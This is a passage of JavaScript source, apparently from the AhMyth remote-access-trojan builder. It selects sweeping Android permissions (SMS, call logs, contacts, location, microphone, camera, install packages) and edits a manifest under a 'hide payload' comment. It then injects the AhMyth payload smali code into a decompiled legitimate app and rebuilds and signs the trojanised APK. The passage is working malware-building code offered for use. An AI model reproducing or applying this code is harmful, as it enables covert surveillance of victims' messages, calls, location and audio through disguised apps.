        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        //hide payload by editing AndroidManifest.xml
        fs.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), 'utf8', (err, data) => {
            var defaultper = `    <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
            <uses-permission android:name="android.permission.BACKGROUND_SERVICE"/>
            <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>`
            var formatted2 = data.replace(defaultper, Permissionsrules);
            fs.writeFile(dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), formatted2, 'utf8', (err) => {
                if (err) {
                    delayedLog('[x] Hiding in AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                    return;
                }
            })
        })


        // empty the framework directory
        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...')

            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"', (error,
                stderr,
                stdout) => {
                if (error) throw error;
            });
        } catch (error) {
            // ignore the error by doing nothing!
        }

        // Build the AhMyth Payload APK
        delayedLog('[★] Building ' + CONSTANTS.apkName + '...');

        var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"',
            (error, stdout, stderr) => {
                if (error !== null) {
                    delayedLog('[x] Building Failed!', CONSTANTS.logStatus.FAIL);
                    fs.mkdir(logPath);
                    fs.writeFile(dir.join(logPath, 'Building.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                    delayedLog('[¡] Building Error written to "Building.log" on...', CONSTANTS.logStatus.INFO)
                    delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                    return;
                }

                delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');

                var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"',
                    (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed!', CONSTANTS.logStatus.FAIL);
                            fs.mkdir(logPath);
                            fs.writeFile(dir.join(logPath, 'Signing.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            delayedLog('[¡] Signing Error written to "Signing.log" on... ', CONSTANTS.logStatus.INFO);
                            delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }


                        fs.unlink(dir.join(outputPath, CONSTANTS.apkName), (err) => {
                            if (err) throw err;

                            delayedLog('[✓] APK Built Successfully.', CONSTANTS.logStatus.SUCCESS);
                            delayedLog('[✓] The APK File has Been Built on ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);


                            fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                if (err) throw err;

                            });
                        });
                    });
            });

    }

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Copying AhMyth Payload Files to Original App...');
        delayedLog('[★] Reading the Original Decompiled APK...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Reading the Decompiled APK Failed!', CONSTANTS.logStatus.FAIL)
                return;
            }

            var ignoreDirs = ['original',
                'res',
                'build',
                'kotlin',
                'lib',
                'assets',
                'META-INF',
                'unknown'];
            var smaliList = files
                .filter((item) => item.isDirectory() &&
                    !(ignoreDirs.includes(item.name)))
                .map((item) => item.name);
            var collator = new Intl.Collator([], {
                numeric: true
            });
            smaliList.sort((a, b) => collator.compare(a, b));
            var lastSmali = smaliList[smaliList.length - 1];
            if (lastSmali == "smali") {
                delayedLog('[★] Creating the new Smali Payload Directory...')
                fs.mkdir(apkFolder + "/smali_classes2", {
                    recursive: true
                }, error => {
                    if (error) {
                        delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                        return;
                    };

                    fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                        dir.join(apkFolder, "smali_classes2"), (error) => {
                            if (error) {
                                delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);

                                fs.mkdir(logPath);
                                fs.writeFile(dir.join(logPath, 'Copying.log'),
                                    `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                                delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            $appCtrl.GenerateApk(apkFolder);

                        });

                });

            } else {

                var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
                var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
                var newSmaliNumber = lastSmaliNumber + 1;
                var payloadSmaliFolder = ('/smali_classes' + newSmaliNumber);
                delayedLog('[★] Creating the new Smali Payload Directory...')

                fs.mkdir(apkFolder + payloadSmaliFolder, {
                    recursive: true
                }, error => {
                    if (error) {
                        delayedLog('[x] Unable to Create the Smali Payload Directory!', CONSTANTS.logStatus.FAIL);
                        return;
                    };

                    delayedLog('[★] Copying AhMyth Payload Files to Original App...');

                    fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"),
                        dir.join(apkFolder, payloadSmaliFolder), (error) => {
                            if (error) {
                                delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);

                                fs.mkdir(logPath);
                                fs.writeFile(dir.join(logPath, 'Copying.log'),
                                    `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                                delayedLog('[¡] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            $appCtrl.GenerateApk(apkFolder);

                        });

                });

            };

        });

    };

    /*$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Copying Ahmyth Files to Orginal app...');
        fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), dir.join(apkFolder, "smali"), (error) => {
            if (error) {
                delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                fs.mkdir(logPath);
                fs.writeFile(dir.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                delayedLog('[x] Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                delayedLog('[x] ' + logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            $appCtrl.GenerateApk(apkFolder);
        })

    };*/

    // function to copy all the ahmyth permissions to the orginal app
    $appCtrl.copyPermissions = (manifest) => {
        var firstPart = manifest.substring(0,
            manifest.indexOf("<application"));
        var lastPart = manifest.substring(manifest.indexOf("<application"));
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");
        //if all unchecked
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = CONSTANTS.permissions
        }
        //if all checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = CONSTANTS.permissions
        }
        //if only one selected
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>`
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>`
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            `
        }
        //if six checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>`
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>          `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var permArray = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
